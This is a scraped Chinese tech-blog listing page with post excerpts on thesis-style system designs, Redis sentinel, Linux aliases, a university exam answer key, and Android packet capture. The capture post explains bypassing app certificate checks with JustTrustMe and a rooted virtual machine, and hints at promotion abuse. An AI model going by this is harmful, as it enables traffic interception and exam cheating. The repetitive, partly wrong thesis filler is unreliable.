GUI技术还包括各种控件，例如按钮、文本框、下拉框、复选框等。这些控件可以用来输入数据、显示数据、控制流程等。例如，一个文本框可以用来输入文字，一个下拉框可以用来选择选项，一个复选框可以用来选择是否同意某些条款。
GUI技术还可以与各种应用软件结合使用，例如办公软件、娱乐软件、网络应用等。通过GUI技术，用户可以更加方便地进行操作，提高工作效率，并且可以避免使用复杂的命令行界面。
总之，GUI技术已经成为了一种不可或缺的技术，它为用户提供了更加直观的操作界面，并且可以与各种应用软件结合使用，提高工作效率。
III. 系统需求分析与设计 A.系统功能需求 基于Java的SSH框架物流配送管理系统设计与实现的系统功能需求介绍：
该系统是一个物流配送管理系统，用于实现货物的追踪、存储、运输和配送。该系统由以下模块组成：
用户管理模块：该模块用于管理用户信息，包括用户名、密码、角色等。用户可以查看自己的订单、货物信息等。订单管理模块：该模块用于管理订单信息，包括订单号、货物信息、收货人、收货地址等。用户可以查看自己的订单、货物信息等。货物管理模块：该模块用于管理货物信息，包括货物编号、货物名称、货物描述、货物状态等。用户可以查看自己的货物信息等。运输管理模块：该模块用于管理运输信息，包括运输方式、运输路线、运输费用等。用户可以查看自己的运输信息等。配送管理模块：该模块用于管理配送信息，包括配送方式、配送路线、配送费用等。用户可以查看自己的配送信息等。统计报表模块：该模块用于生成各种报表，包括订单报表、货物报表、运输报表、配送报表等。用户可以查看自己的订单报表、货物报表、运输报表、配送报表等。
该系统支持以下功能：用户登录：用户可以登录系统，查看自己的订单、货物信息等。订单管理：用户可以查看自己的订单、货物信息等。货物管理：用户可以查看自己的货物信息等。运输管理：用户可以查看自己的运输信息等。配送管理：用户可以查看自己的配送信息等。统计报表：用户可以查看自己的订单报表、货物报表、运输报表、配送报表等。
该系统使用Java开发，采用Spring框架进行模块化设计。该系统支持多种数据库，包括MySQL、Oracle、SQL Server等。该系统支持多种操作系统，包括Windows、Linux、Mac等。该系统支持多种网络环境，包括局域网、广域网、互联网等。该系统支持多种传输协议，包括TCP、UDP、FTP等。该系统支持多种安全协议，包括SSL、TLS、SSH等。 B.业务流程分析 基于Java的SSH框架物流配送管理系统设计与实现的业务流程分析，主要分为以下几个步骤：
需求分析
在设计任何系统之前，必须先进行需求分析。在这个过程中，必须明确系统需要实现的功能、系统的目标用户以及系统需要满足的需求。例如，需要确定系统需要实现哪些功能、系统的目标用户是谁、系统需要满足哪些需求。设计系统架构
在完成需求分析后，需要根据需求分析的结果设计系统架构。系统架构是指系统各部分的组成、系统各部分之间的关系以及系统的数据流程等。例如，需要确定系统需要实现哪些功能、系统的目标用户是谁、系统需要满足哪些需求。同时，需要确定系统的数据结构、数据流程以及系统的数据库等。开发系统
在设计系统架构后，需要开始开发系统。在这个过程中，需要编写代码、编写文档以及进行测试等。例如，需要编写代码来实现系统中的功能、编写文档来说明系统的使用方法以及进行测试来确保系统的质量。测试系统
在开发系统后，需要对系统进行测试。在这个过程中，需要测试系统的功能、测试系统的性能以及测试系统的稳定性等。例如，需要测试系统的各个功能是否正常工作、系统的性能是否符合要求以及系统的稳定性是否足够等。部署系统
在完成测试后，需要将系统部署到实际环境中。在这个过程中，需要将系统部署到服务器上，并确保系统可以正常运行。例如，需要将系统部署到云服务器上，并确保系统可以正常运行。维护系统
在系统部署后，需要对系统进行维护。在这个过程中，需要修复系统中的漏洞、优化系统的性能以及升级系统的版本等。例如，需要修复系统中的漏洞、优化系统的性能以及升级系统的版本等。 C.数据库设计 首先，我们需要定义一个物流配送管理系统需要包含哪些数据。在这个系统中，我们需要存储订单信息、货物信息、司机信息、运输信息等。因此，我们需要创建以下表格：
订单表格（Orders）：
订单ID (orderID)
司机ID (driverID)
货物ID (goodsID)
订单日期 (orderDate)
总费用 (totalFee)
备注 (remark)
司机表格 (Drivers)：
司机ID (driverID)
姓名 (name)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dacb8725f68ed8f99a1bce7b0d3b44ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72e63f6bbc3e9c87f7d74b7173f4d416/" rel="bookmark">
			基于java的HTML5实时聊天工具系统设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于java的HTML5实时聊天工具系统设计与实现
I. 引言 A.研究背景和动机 基于Java的HTML5实时聊天工具系统设计与实现的研究背景和动机是创建一个高效、稳定、安全的在线聊天工具系统，以满足用户在线交流的需求。该系统应该具有以下功能：实时聊天、语音聊天、文件传输、在线教育、网络直播等。此外，该系统还应该具有高效的网络连接、稳定的服务器和良好的用户体验。为了实现这些目标，需要使用Java编程语言、HTML5技术、RESTful API、Spring Boot框架等技术，同时需要考虑安全性和可靠性，以及性能和用户体验等因素。
B.目标和意义 基于Java的HTML5实时聊天工具系统设计与实现的目标是提供一个实时、高效、安全、稳定的聊天工具系统，满足不同用户的需求。该系统应该具有以下几个方面的功能：
实时聊天功能：该系统应该支持文字、图片、语音等多种方式的聊天，实现实时消息传递，用户可以在任何时间、任何地点进行聊天。消息管理功能：该系统应该提供消息管理功能，包括消息历史记录、消息删除、消息回复等，用户可以方便地查看和管理自己的聊天记录。聊天室功能：该系统应该支持创建聊天室、加入聊天室、退出聊天室等功能，用户可以方便地创建和加入不同的聊天室，并与其他用户进行交流。隐私保护功能：该系统应该提供用户隐私保护功能，包括用户信息加密、聊天记录加密等，确保用户信息的安全性和保密性。跨平台支持：该系统应该支持跨平台支持，包括PC端、移动端、Web端等多种平台，用户可以方便地进行聊天。数据存储功能：该系统应该提供数据存储功能，包括用户信息、聊天记录等数据的存储，保证数据的安全性和可靠性。
该系统应该具有以下几个方面的意义：提升用户体验：该系统应该提供高质量的聊天体验，让用户可以更加便捷地进行聊天，增强用户黏性和满意度。拓展应用场景：该系统应该支持多种应用场景，包括企业、学校、社交等，帮助用户更好地进行沟通和交流。促进商业价值：该系统应该具有商业价值，包括广告、电商等，为用户提供更好的商业机会和价值。提高信息安全：该系统应该提供可靠的安全保障，包括数据加密、用户身份认证等，确保用户信息的安全性和保密性。增强用户黏性：该系统应该提供稳定的服务，保证用户可以方便地进行聊天，增强用户黏性和满意度。 II. 相关技术和工具 A.Java语言 Java语言是一种面向对象的高级编程语言，由Sun Microsystems（现在是Oracle公司）于1995年发布。Java被设计成可移植、可靠、安全和简单易学的语言，以及具有优秀的性能和高效的垃圾回收机制。
Java语言拥有许多特点和优势，下面是一些主要特点的介绍：
简单易学：Java语言借鉴了C++语法，但摒弃了C++中的复杂和容易出错的部分。它具有清晰、简洁的语法，易于学习和理解。跨平台性：Java程序是一次编写，到处运行。Java程序在编译后生成的字节码可以在任何支持Java虚拟机（JVM）的平台上运行，而不需要重新编译。面向对象：Java语言是一种真正的面向对象编程语言，具有封装、继承和多态等面向对象的概念和特征。这使得Java具有更好的结构化、可读性和可维护性。内存管理：Java具有自动垃圾回收机制，程序员无需手动管理内存。通过垃圾回收器，Java可以自动识别并回收不再使用的内存资源，避免了内存泄漏和野指针等问题。多线程支持：Java提供了强大的多线程支持，使得程序能够同时执行多个任务。多线程可以提高程序的性能和响应能力。丰富的类库和API：Java拥有众多的类库和应用程序接口（API），包括各种功能和领域所需的类和方法。这些类库和API极大地简化了程序开发工作，提高了开发效率。安全性：Java对安全性有着很高的重视，在设计上考虑了各种安全因素，如通过字节码验证、安全管理器等机制来防止恶意代码的执行。分布式计算：Java提供了强大的网络编程功能，使其成为构建分布式计算应用和网络服务的理想语言。
总的来说，Java语言是一种跨平台、可移植、高效、可靠、简单易学的面向对象编程语言。它广泛应用于各种领域，如Web开发、移动应用开发、企业应用开发等。 B.数据库技术 数据库技术是指应用于设计、开发和管理数据库的一系列技术和方法。数据库技术可以帮助用户实现数据的存储、管理和查询等功能，提高数据处理的效率和准确性。数据库技术的核心是数据模型，数据模型是描述和组织数据的形式化表示。常见的数据模型包括层次模型、网状模型、关系模型和面向对象模型等。
层次模型是一种树形结构，数据按照层级关系组织。网状模型是一种非树形结构，数据之间没有层级关系。关系模型是一种基于表格的数据模型，数据之间通过关系连接。面向对象模型是一种基于类的数据模型，数据之间通过对象连接。
数据库技术可以分为关系型数据库和非关系型数据库。关系型数据库是一种基于表格的数据模型，数据之间通过关系连接。非关系型数据库是一种基于文档、键值、列族等数据结构的数据模型，数据之间没有固定的关系。
数据库技术可以应用于各种领域，包括企业管理、金融、医疗、电子商务等。企业管理可以通过数据库技术实现数据的存储、管理和查询，提高企业管理的效率和准确性。金融可以通过数据库技术实现风险控制、投资分析等功能，提高金融行业的效率和安全性。医疗可以通过数据库技术实现医疗数据的存储、管理和查询，提高医疗行业的效率和质量。电子商务可以通过数据库技术实现商品信息、订单信息的存储和管理，提高电子商务行业的效率和安全性。
C.GUI技术 GUI（Graphical User Interface）技术是一种图形化的用户界面，通过图形化的方式来展示用户需要使用的各种功能。随着计算机技术的发展，GUI技术已经成为我们日常生活中不可或缺的一部分。
GUI技术可以分为两种不同的类型：命令行和图形化。命令行界面是指通过命令行来展示各种功能，例如Windows操作系统和Linux操作系统。图形化界面是指通过图形化的方式来展示各种功能，例如Mac OS X操作系统和Windows操作系统。
GUI技术在我们的日常生活中扮演着非常重要的角色。无论是工作还是娱乐，我们都需要使用GUI技术来完成各种任务。例如，我们可以使用GUI技术来打开电子邮件、浏览网页、发送电子邮件等等。
在未来，GUI技术将继续发展，我们将看到更多的图形化界面出现。这将为用户提供更好的使用体验，并且将帮助我们更好地完成各种任务。
III. 系统需求分析与设计 A.系统功能需求 实时聊天功能：实现两个用户之间的文字聊天功能，并支持表情、语音和视频等多种方式的聊天。用户管理功能：实现对用户信息的添加、修改、删除、查询等管理功能，并支持用户信息的批量操作。通知功能：实现对用户的聊天记录、好友请求、私信等信息的推送，并支持设置推送时间和推送方式。数据备份和恢复功能：实现对聊天记录的备份和恢复，并支持对备份数据的加密和压缩。消息过滤功能：实现对用户发送的聊天消息进行过滤，并支持对过滤规则的添加、修改和删除。消息记录备份功能：实现对聊天记录的备份，并支持对备份数据的加密和压缩。消息记录还原功能：实现对聊天记录的还原，并支持对还原数据的加密和压缩。消息推送功能：实现对用户的聊天记录、好友请求、私信等信息的推送，并支持设置推送时间和推送方式。消息推送数据加密功能：实现对推送数据进行加密，并支持对加密密钥的管理。数据存储功能：实现对聊天记录、好友请求、私信等信息的存储，并支持对存储数据的加密和压缩。数据查询功能：实现对聊天记录、好友请求、私信等信息的查询，并支持对查询条件的添加、修改和删除。消息记录备份功能：实现对聊天记录的备份，并支持对备份数据的加密和压缩。消息记录还原功能：实现对聊天记录的还原，并支持对还原数据的加密和压缩。数据备份和恢复功能：实现对聊天记录、好友请求、私信等信息的备份和恢复，并支持对备份数据的加密和压缩。 B.业务流程分析 用户登录
用户通过输入用户名和密码进行登录，登录成功后进入聊天室页面。聊天室列表
用户可以浏览聊天室列表，查看当前可用的聊天室。聊天室详情
用户可以选择进入某个聊天室，查看该聊天室的聊天记录和聊天室成员列表。发送消息
用户可以在聊天室中发送消息，消息可以包含文字、图片、表情等。消息处理
系统对用户发送的消息进行处理，包括消息存储、消息排序、消息过滤等。聊天室管理
管理员可以对聊天室进行管理，包括添加、删除、修改聊天室成员、设置聊天室规则等。数据存储
系统对用户和聊天室数据进行存储，包括用户信息、聊天室信息、消息记录等。消息发送接口
系统提供消息发送接口，方便其他应用程序调用。消息接收接口
系统提供消息接收接口，方便其他应用程序调用。消息处理接口
系统提供消息处理接口，方便其他应用程序调用。 C.数据库设计 HTML5实时聊天工具系统是一个基于web端的实时聊天系统，系统需要支持以下功能：
用户注册和登录发送和接收消息保存聊天记录消息发送状态的实时显示消息发送状态的记录聊天室管理
为了实现这些功能，需要设计一个数据库来存储用户信息、聊天记录和聊天室信息。用户信息表
UserID, Username, Password, Email, Avatar聊天记录表
ChatID, UserID, ChatType, ChatBody, ChatTime
ChatType表示聊天类型，ChatBody表示聊天内容，ChatTime表示聊天时间。聊天室信息表
ChatRoomID, ChatRoomName, ChatRoomCode, ChatRoomAvatar, ChatRoomAvatarURL, ChatRoomCode, ChatRoomRole, ChatRoomRoleCode, ChatRoomRoleName
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72e63f6bbc3e9c87f7d74b7173f4d416/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa6577fa3efabc7b700d3bee40fbad7e/" rel="bookmark">
			Redis 主库挂了，如何不间断服务？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、哨兵机制的基本流程
2、主观下线和客观下线
3、如何选定新的主库？
总结
// 你只管前行，剩下的交给时间
在 reids 主从库集群模式下，如果从库发生故障了，客户端可以继续向主库或其他从库发送请求，进行相关的操作，但是如果主库发生故障了，那就直接会影响到从库的同步，因为从库没有相应的主库可以进行数据复制操作了。// 没有主库，从库无法进行数据同步，客户端无法进行写
而且，如果客户端发送的都是读操作请求，那还可以由从库继续提供服务，这在只读的业务场景下还能被接受。但是，一旦有写操作请求了，按照主从库模式下的读写分离要求，需要由主库来完成写操作。此时，也没有实例可以来服务客户端的写操作请求了，如下图所示：
无论是写服务中断，还是从库无法进行数据同步，都是不能接受的。所以，如果主库挂了，我们就需要运行一个新主库，比如说把一个从库切换为主库，把它当成主库。这就涉及到三个问题：
主库真的挂了吗？该选择哪个从库作为主库？怎么把新主库的相关信息通知给从库和客户端呢？ 这就要提到哨兵机制了。在 Redis 主从集群中，哨兵机制是实现主从库自动切换的关键机制，它有效地解决了主从复制模式下故障转移的这三个问题。// 哨兵是用来解决主从切换问题的
1、哨兵机制的基本流程 哨兵其实就是一个运行在特殊模式下的 Redis 进程，主从库实例运行的同时，它也在运行。哨兵主要负责的就是三个任务：监控、选主（选择主库）和通知。
我们先看监控。监控是指哨兵进程在运行时，周期性地给所有的主从库发送 PING 命令，检测它们是否仍然在线运行。如果从库没有在规定时间内响应哨兵的 PING 命令，哨兵就会把它标记为“下线状态”；同样，如果主库也没有在规定时间内响应哨兵的 PING 命令，哨兵就会判定主库下线，然后开始自动切换主库的流程。// 心跳检测
这个流程首先是执行哨兵的第二个任务，选主。主库挂了以后，哨兵就需要从很多个从库里，按照一定的规则选择一个从库实例，把它作为新的主库。这一步完成后，现在的集群里就有了新主库。
然后，哨兵会执行最后一个任务：通知。在执行通知任务时，哨兵会把新主库的连接信息发给其他从库，让它们执行 replicaof 命令，和新主库建立连接，并进行数据复制。同时，哨兵会把新主库的连接信息通知给客户端，让它们把请求操作发到新主库上。// 通知从库，客户端
在这三个任务中，通知任务相对来说比较简单，哨兵只需要把新主库信息发给从库和客户端，让它们和新主库建立连接就行，并不涉及决策的逻辑。但是，在监控和选主这两个任务中，哨兵需要做出两个决策：// 谁挂了？应该选谁？
在监控任务中，哨兵需要判断主库是否处于下线状态；在选主任务中，哨兵也要决定选择哪个从库实例作为主库。 redis 哨兵对主库的下线判断有“主观下线”和“客观下线”两种。那么，为什么会存在两种判断呢？它们的区别和联系是什么呢？
2、主观下线和客观下线 什么是“主观下线”。
哨兵进程会使用 PING 命令检测它自己和主、从库的网络连接情况，用来判断实例的状态。如果哨兵发现主库或从库对 PING 命令的响应超时了，那么，哨兵就会先把它标记为“主观下线”。
如果检测的是从库，那么，哨兵简单地把它标记为“主观下线”就行了，因为从库的下线影响一般不太大，集群的对外服务不会间断。
但是，如果检测的是主库，那么，哨兵还不能简单地把它标记为“主观下线”，开启主从切换。因为很有可能存在这么一个情况：那就是哨兵误判了，其实主库并没有故障。可是，一旦启动了主从切换，后续的选主和通知操作都会带来额外的计算和通信开销。// 如何准确的进行判断，多次验证？
为了避免这些不必要的开销，要特别注意误判的情况。
首先，我们要知道啥叫误判。很简单，就是主库实际并没有下线，但是哨兵误以为它下线了。误判一般会发生在集群网络压力较大、网络拥塞，或者是主库本身压力较大的情况下。
一旦哨兵判断主库下线了，就会开始选择新主库，并让从库和新主库进行数据同步，这个过程本身就会有开销，例如，哨兵要花时间选出新主库，从库也需要花时间和新主库同步。而在误判的情况下，主库本身根本就不需要进行切换的，所以这个过程的开销是没有价值的。正因为这样，我们需要判断是否有误判，以及减少误判。// 误判会带来额外的开销，且切换无价值
那怎么减少误判呢？在日常生活中，当我们要对一些重要的事情做判断的时候，经常会和家人或朋友一起商量一下，然后再做决定。
哨兵机制也是类似的，它通常会采用多实例组成的集群模式进行部署，这也被称为哨兵集群。引入多个哨兵实例一起来判断，就可以避免单个哨兵因为自身网络状况不好，而误判主库下线的情况。同时，多个哨兵的网络同时不稳定的概率较小，由它们一起做决策，误判率也能降低。// 哨兵集群，少数服从多数
在判断主库是否下线时，不能由一个哨兵说了算，只有大多数的哨兵实例，都判断主库已经“主观下线”了，主库才会被标记为“客观下线”，这个叫法也是表明主库下线成为一个客观事实了。这个判断原则就是：少数服从多数。同时，这会进一步触发哨兵开始主从切换流程。// 集群做决定都是少数服从多数
简单来说，“客观下线”的标准就是，当有 N 个哨兵实例时，最好要有 N/2 + 1 个实例判断主库为“主观下线”，才能最终判定主库为“客观下线”。这样一来，就可以减少误判的概率，也能避免误判带来的无谓的主从库切换。（当然，有多少个实例做出“主观下线”的判断才可以，可以由 Redis 管理员自行设定）。
借助于多个哨兵实例的共同判断机制，我们就可以更准确地判断出主库是否处于下线状态。如果主库的确下线了，哨兵就要开始下一个决策过程了，即从许多从库中，选出一个从库来做新主库。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa6577fa3efabc7b700d3bee40fbad7e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6b1c685863117ebbdbe60d68c69bc9f/" rel="bookmark">
			Linux shell编程学习笔记31：alias 和 unalias 操作 命令别名
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 0 前言1 定义别名2 查看别名 2.1 查看所有别名2.2 查看某个别名 2.2.1 alias 别名2.2.2 alias | grep 别名字符串2.2.3 使用 Ctrl+Alt+E 组合键3 unalias：删除别名4 如何执行命令本身而非别名 4.1 方法1：使用 Ctrl+Alt+E 组合键 &amp;&amp; unalias4.2 方法2：在命令前加上命令文件的绝对路径4.3 方法3：在命令前加上相对路径4.4 方法4：在命令前加上反斜线\5 如何让别名永久有效6 为何推荐使用单引号7 参考资料 0 前言 记得在DOS中有个doskey命令，使用doskey命令可以定义宏，宏的的执行优先级是最高的，比DOS的内置命令还高（DOS中的命令执行优先级从高至低依次是：宏命令、DOS内部命令，以com为扩展名的可执行程序，以exe位扩展名的可执行程序、以bat位扩展名的批处理程序）。
这就意味着，如果你定义的宏与dos的内置命令同名，比如dir，当你在命令行输入dir时，系统会优先执行你宏，而不是dos的内置命令，这为我们提供了修改内部命令功能的途径。
那以Linux中是否提供有相似的功能呢？
1 定义别名 在Linux中，我们使用alias命令来定义命令别名。格式如下：
alias [命令别名[=值]]
与定义变量相似，在定义命令别名时，要注意：
等号（=）前后不能有空格，否则就会出现变成比较，引起语法错误如果值中有空格或tab，则值一定要使用单引号、双引号括起来（推荐单引号） 2 查看别名 2.1 查看所有别名 要查看所有别名，直接输入 alias 命令，不加任何选项和参数即可：
purpleEndurer @ bash $alias
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l.='ls -d .* --color=auto'
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6b1c685863117ebbdbe60d68c69bc9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4f8164e4bf028e1e7be3d878afff4b5/" rel="bookmark">
			电子科技大学-系统分析与设计（2023年秋）-学堂在线-期末考试答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 先看答题成绩1~5 题6~10 题11~15 题16~50题 先看答题成绩 1~5 题 1.在类图的几种可视性中，下面哪种可视性的属性或操作对本类和子类可见？C
2.状态机图描述什么场景？D
3.下面哪项不属于系统规划的原则？C
4.针对一个网络订餐系统需求分析，采用下面哪种需求采集方法最合适？B
5.在系统开发的哪个阶段进行架构设计？B
6~10 题 11~15 题 16~50题 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eac8fdf33be01f363192f733b0acfd47/" rel="bookmark">
			ARM Cortex-M核的内核态，用户态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，用户态和内核态是从操作系统层面上来划分的，如果没有操作系统，我可以直接运行在特权模式下，并使用特权指令。在这种情况下，我将负责管理和控制系统资源，执行关键操作，以及确保系统的安全性和稳定性。我可以直接操作底层硬件寄存器和资源，包括使用特权指令来执行必要的操作。像51单片机，可以使用特权指令，直接访问和操作底层硬件资源，例如配置I/O口、定时器、中断等。
但是在使用操作系统层面下，例如FreeRTOS：FreeRTOS 有意将特权指令与用户程序进行了隔离，以确保系统的安全性和稳定性。
FreeRTOS 使用了多种机制来实现特权指令与用户程序的隔离：
特权级别：FreeRTOS 内核运行在较高的特权级别（特权模式），而用户程序运行在较低的特权级别（非特权模式）。所以即便在用户程序上我用了特权指令，但是因为特权级别不够，我的特权指令也不会生效。上下文切换：当发生任务切换时，FreeRTOS 会保存当前任务的上下文（包括寄存器状态等），并恢复下一个任务的上下文。用户程序无法直接控制上下文切换的过程，从而实现了对特权操作的隔离。系统调用：FreeRTOS 提供了一组系统调用接口，允许用户程序通过这些接口请求操作系统代表其执行特权操作。系统调用是在特权模式下实现的，可以执行特权指令和访问特权级别下的资源。通过系统调用接口，用户程序可以间接地执行需要特权操作的功能，同时由操作系统验证和控制请求的合法性。 虽然在操作系统层面上，被划分出了用户态和内核态，但实际在ARM Cortex-M领域，并没有做到完全隔离。毕竟作为MCU，如果完全隔离，对开发会有很大的难度。而像ARM Cortex-A核系列，跑的是linux，一般会做到完全隔离，我们一般都是通过读写文件对设备进行操作，而不是直接对寄存器进行操作。
比如我已经知道了寄存器的地址：
我在某个任务中，直接对寄存器进行操作：
判断系统处于什么状态，可以在调试的时候看CPSR寄存器。
在ARM架构下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8058cb811e16f9f16363eb0f1eb36e29/" rel="bookmark">
			pymysql.err.ProgrammingError: (1064, “You have an error in your SQL syntax
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pymysql.err.ProgrammingError: (1064, “You have an error in your SQL syntax； 对于报错的分析：很明显是sql语句执行出现了问题，但是仔细检查语句后并没有问题
# 原sql语句 up_sql = "UPDATE a_spider_zhengchang SET content='{}' WHERE id='{}'".format(new_content, i) 查阅资料有人说是关键字没有``的问题，但是修改后依旧无效
于是决定打印出sql语句后得出被执行的sql代码：
UPDATE a_spider_zhengchang SET content='\r\n &lt;div class="yxjjinfo"&gt; \r\n \r\n \r\n\r\n\r\n &lt;p&gt; ... &lt;/p&gt; \r\n \r\n \r\n\r\n\r\n\r\n &lt;h3&gt; \r\n \r\n\r\n &lt;strong&gt; \r\n \r\n ...\r\n\r\n &lt;/strong&gt; \r\n \r\n\r\n &lt;/h3&gt; \r\n \r\n \r\n\r\n\r\n\r\n &lt;p&gt; \r\n \r\n ...\r\n\r\n &lt;/p&gt; \r\n \r\n \r\n\r\n\r\n\r\n &lt;p&gt; \r\n \r\n ...\r\n\r\n &lt;/p&gt; \r\n \r\n \r\n\r\n\r\n\r\n &lt;p&gt; \r\n \r\n .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8058cb811e16f9f16363eb0f1eb36e29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0939d14523d26875ffd54848a90801d/" rel="bookmark">
			安卓端小黄鸟抓包保姆级教程（附带全套工具，完美解决无网络和ROOT问题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		抓包工具 1. vmos pro
2. 小黄鸟
3. JustTrustMe
4. JustMeplus
5. JustMeAlreadly
6.MT管理工具
抓包环境 vmos pro（*虚拟机安卓9版本中）
抓包教程 一，安装所需工具，工具安装包我会放在文末自行下载安装
注意：软件需先安装到真机，先不要导入到虚拟机中
二，真机中打开小黄鸟导出SSL证书
注意：证书选择Stem Trusted（.0）看图操作
三，将第一步安装的六个软件（除小黄鸟和虚拟机外）的四款软件和证书导入到虚拟机中
注意：这一步是在虚拟机中操作，具体图文步骤如下
1.打开虚拟机的安卓9版本并开启root权限
2.选择右下方导入按钮，找到需要导入的四款软件，和证书（证书在文件-内部存储-HttpCanary-cert中）
3.导入之后，桌面上虚拟机桌面只会显示JustMePlush和MT管理器，这是正常现象
四，开始导入证书（以下步骤是在虚拟机中操作）
1打开MT管理器，找到证书（证书在VMOSfiletransferstation文件夹中如图）此时先在右半栏中找到etc/security/cacerts然后长按证书在跳出的功能面板中找到复制点击就会自行复etc/security/cacerts路径下
即：证书导入完毕
五，安装JustTrustMe
此应用与证书在同一文件夹（VMOSfiletransferstation）下，点击安装即可
自此所有配置完毕
六，向虚拟机中导入你要抓包的应用，然后真机中打开小黄鸟进行抓包即可（切记:在小黄鸟中把抓包目标应用设置为虚拟机）这样就可以完美抓包了
end:
软件工具：工具在这
由于网盘和谐问题so
小黄鸟在这：小黄鸟
完结
创作不易，你的关注我的动力，这期内容就到这了，有不明白的友友可以评论区留言，下期我们一起学习怎样将青龙面板与抓包结合实现自动化（薅羊毛等），下期，我们不见不散。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ec02e08039f570dd81a268f12868fd8/" rel="bookmark">
			评价体系如何构建？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文将针对权重计算的一些常见问题进行说明：如组合赋权法的综合权重值如何计算？多层级权重如何计算？用多种方法计算得到的权重如何合并为综合权重用于之后的分析？常见的不同权重计算方法的搭配方式？
一、九种权重计算方法回顾
权重计算方法的选择在评级指标体系构建中属于重中之重，不同的方法对应的计算原理并不相同。在实际分析过程中，应结合数据特征及专业知识选择适合的权重计算。
常用的九种权重计算方法特征如下表：
有关权重计算方法的详细说明可查看往期内容：
干货合集→九大权重计算方法
毕业论文 | 13种权重计算相关方法汇总
二、组合赋权法
每种权重计算方法都有其适用范围，有时候需要采用多种方法测量同一份数据的权重，此时称为组合赋权法，这样得到综合权重性能更高，更加能反映出数据的真实特征。
举例说明：同时使用熵值法和AHP法， AHP法能够体现专家对不同指标的经验，熵值法可以反映出数据本身提供的信息量特征，两者结合使用不仅可以减少AHP法赋权的主观性，也会减少数据变化导致权重的波动。
那么多种权重计算方法组合使用，如何得到组合赋权法的权重值（综合权重）呢？通常根据不同权重组合方法，可分为以下两种情况讨论：
1、两种权重计算方法原理相同
情况1：两种权重计算方法原理相同，属于同一类方法，那么此时可计算平均值，所得结果即为组合赋权法的权重值。
举例说明：AHP层次分析法和优序图法，都属于主观赋值法，利用数字大小计算权重，此时可计算两者均值作为综合权重。
比如使用AHP层次分析法得到指标A1的权重值为0.1，使用优序图法得到指标A1的权重值为0.2，那么二者组合赋权法得到指标A1的综合权重即为：WA1=（0.1+0.2）/ 2=0.15。同理可计算其他指标权重值。
2、两种权重采用的计算原理不相同
情况2：两种权重采用的计算原理不相同，利用的数据特征也不一致，此时计算综合权重的方法不止一种，建议在实际处理时以参考文献为准。
举例1：熵值法和AHP法计算权重 一个是主观赋值权重，一个是客观赋值权重。将2种方法结合使得到的数据更加能反映实际情况。常用公式：W=A*B/ (∑A*B)。A、B为2种方法求得的权重。计算过程如下：
除此之外，还有其他的计算公式，如 W=(A+B)/∑(A+B)，具体可参考相关参考文献。
举例2：主成分和AHP层次分析法 常用公式：W=tA+(1-t)B。A、B为2种方法求得的权重，t为权重系数。t的取值在0~1之间，其取决于AHP法各指标权重的差异程度（或参考相关文献）。
如果AHP法各指标权重差距不大时，t应该取小些。如果AHP法各指标权重差距较大时，t应该取大些。如果两种方法计算结果差别不大，t值默认取0.5。 比如当t值取0.3，A1指标综合权重：WA1=0.3*0.1+(1-0.3)*0.2=0.17。其他指标计算过程以此类推。
补充：权重系数确定
权重系数的确定并不局限于一种方式，具体可参考相关参考文献。如李良晨《基于组合赋权的国有建筑企业PPP运营能力评价研究》中，权重系数确定方法如下：
李良晨. 基于组合赋权的国有建筑企业PPP运营能力评价研究[D].郑州大学,2022.
又如张晨等《金沙江流域泥石流的组合赋权法危险度评价》中所用的距离函数法确定权重系数过程如下：
张晨,王清,陈剑平,谷复光,张文. 金沙江流域泥石流的组合赋权法危险度评价[J]. 岩土力学,2011,32(03):831-836.
综上所述，使用组合赋权法进行综合权重计算时，以上仅提供了一些常见的比较简单的计算方式，具体的综合权重计算应该以参考文献为准。
三、多层级权重计算
在多层次综合评价研究中，不光需要计算一级指标权重，还有二级指标权重，甚至三级指标权重，那么应该如何计算呢？
1、举例说明
以全文使用AHP层次分析法计算权重为例：有这样一个研究需要构建员工绩效评价体系，设计了如下图的评价指标体系，并通过专家打分收集数据。现通过AHP法计算各级权重，并使用该评价体系计算每个员工的综合得分情况。
step1：计算一级指标权重（或者先计算二级指标权重）
在分析时，每一层的权重需要单独计算。首先使用SPSSAU【综合评价】--【AHP层次分析】计算一级指标“工作态度”“学习能力”“工作能力”“团队协作”的权重。将专家打分结果填入表格：
SPSSAU输出AHP层次分析法结果如下：
step2：计算二级指标权重
相同的方法，再进行二级指标权重计算。如计算“工作态度”下属各个指标（A1、A2、A3）的权重：
